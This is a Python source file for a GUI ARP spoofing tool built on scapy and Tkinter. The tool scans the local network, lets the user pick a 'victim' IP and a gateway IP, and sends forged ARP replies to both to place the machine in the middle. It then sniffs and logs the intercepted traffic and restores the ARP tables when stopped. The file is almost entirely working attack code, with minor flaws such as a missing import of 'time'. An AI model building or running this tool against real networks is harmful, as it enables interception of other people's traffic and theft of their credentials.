from scapy.all import *
import os
import sys
import threading
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import psutil
import socket
import logging

class ARP_Spoofer:
    def __init__(self, master):
        self.master = master
        master.title("ARP Spoofer")

        # Set up logging
        logging.basicConfig(filename="arp_spoofer.log", level=logging.INFO, 
                            format="%(asctime)s - %(levelname)s - %(message)s")

        self.interface_label = tk.Label(master, text="Select Network Interface:")
        self.interface_label.pack()

        self.interface_combo = ttk.Combobox(master)
        self.interface_combo['values'] = self.get_interfaces()
        self.interface_combo.current(0)
        self.interface_combo.pack()

        self.scan_button = tk.Button(master, text="Scan Network", command=self.scan_network)
        self.scan_button.pack()

        self.target_ip_label = tk.Label(master, text="Target IP (Victim's IP):")
        self.target_ip_label.pack()

        self.target_ip_combo = ttk.Combobox(master)
        self.target_ip_combo.pack()

        self.host_ip_label = tk.Label(master, text="Host IP (Gateway/Router's IP):")
        self.host_ip_label.pack()

        self.host_ip_combo = ttk.Combobox(master)
        self.host_ip_combo.pack()

        self.spoof_button = tk.Button(master, text="Start Spoofing", command=self.start_spoof)
        self.spoof_button.pack()

        self.stop_button = tk.Button(master, text="Stop Spoofing", command=self.stop_spoof)
        self.stop_button.pack()

        self.spoofing = False

        self.packet_text = scrolledtext.ScrolledText(master, width=80, height=20)
        self.packet_text.pack()

        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)

    def get_interfaces(self):
        interfaces = psutil.net_if_addrs()
        return list(interfaces.keys())

    def get_mac(self, ip):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            messagebox.showerror("Error", f"Unable to get MAC address for IP: {ip}")
            logging.error(f"Unable to get MAC address for IP: {ip}")
            return None

    def spoof(self, target_ip, host_ip):

        packet = ARP(op=2, pdst=target_ip, psrc=host_ip)
        send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        if not destination_mac or not source_mac:
            return
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

    def arp_spoof(self, target_ip, host_ip):
        try:
            while self.spoofing:
                self.spoof(target_ip, host_ip)
                self.spoof(host_ip, target_ip)
                logging.info(f"Sent spoofed packets to {target_ip} and {host_ip}")
                time.sleep(2)
        except Exception as e:
            logging.error(f"Error in ARP spoofing: {e}")
            self.restore(target_ip, host_ip)
            self.restore(host_ip, target_ip)
        finally:
            self.restore(target_ip, host_ip)
            self.restore(host_ip, target_ip)

    def packet_sniffer(self, target_ip, host_ip):
        try:
            sniff(filter=f"ip host {target_ip} or ip host {host_ip}", prn=self.process_packet, store=0)
        except Exception as e:
            logging.error(f"Error in packet sniffing: {e}")

    def process_packet(self, packet):
        self.packet_text.insert(tk.END, f"{packet.summary()}\n")
        self.packet_text.yview(tk.END)
        logging.info(f"Captured packet: {packet.summary()}")

    def scan_network(self):
        interface = self.interface_combo.get()
        if interface not in psutil.net_if_addrs():
            messagebox.showerror("Error", "Selected interface is not available.")
            return
        ip_range = self.get_ip_range(interface)
        devices = self.scan(ip_range)
        ips = [device['ip'] for device in devices]

        self.target_ip_combo['values'] = ips
        self.host_ip_combo['values'] = ips

    def get_ip_range(self, interface):
        try:
            addrs = psutil.net_if_addrs()
            ip_info = [addr for addr in addrs[interface] if addr.family == socket.AF_INET][0]
            ip = ip_info.address
            netmask = ip_info.netmask
            network = ip.split('.')[:-1]
            network.append('0/24')
            return '.'.join(network)
        except Exception as e:
            messagebox.showerror("Error", f"Unable to get IP range: {e}")
            logging.error(f"Unable to get IP range: {e}")
            return None

    def scan(self, ip_range):
        try:
            arp_request = ARP(pdst=ip_range)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

            devices = []
            for sent, received in answered_list:
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})

            return devices
        except Exception as e:
            messagebox.showerror("Error", f"Error scanning network: {e}")
            logging.error(f"Error scanning network: {e}")
            return []

    def start_spoof(self):
        if not self.spoofing:
            target_ip = self.target_ip_combo.get()
            host_ip = self.host_ip_combo.get()
            if target_ip == host_ip:
                messagebox.showerror("Error", "Target IP and Host IP must be different.")
                return
            self.spoofing = True
            self.spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, host_ip))
            self.spoof_thread.start()
            self.sniffer_thread = threading.Thread(target=self.packet_sniffer, args=(target_ip, host_ip))
            self.sniffer_thread.start()
            messagebox.showinfo("ARP Spoofer", "Started ARP spoofing")
            logging.info("Started ARP spoofing")

    def stop_spoof(self):
        if self.spoofing:
            self.spoofing = False
            self.spoof_thread.join()
            self.sniffer_thread.join()
            target_ip = self.target_ip_combo.get()
            host_ip = self.host_ip_combo.get()
            self.restore(target_ip, host_ip)
            self.restore(host_ip, target_ip)
            messagebox.showinfo("ARP Spoofer", "Stopped ARP spoofing")
            logging.info("Stopped ARP spoofing")

    def on_closing(self):
        if self.spoofing:
            self.stop_spoof()
        self.master.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    arp_spoofer = ARP_Spoofer(root)
    root.mainloop()
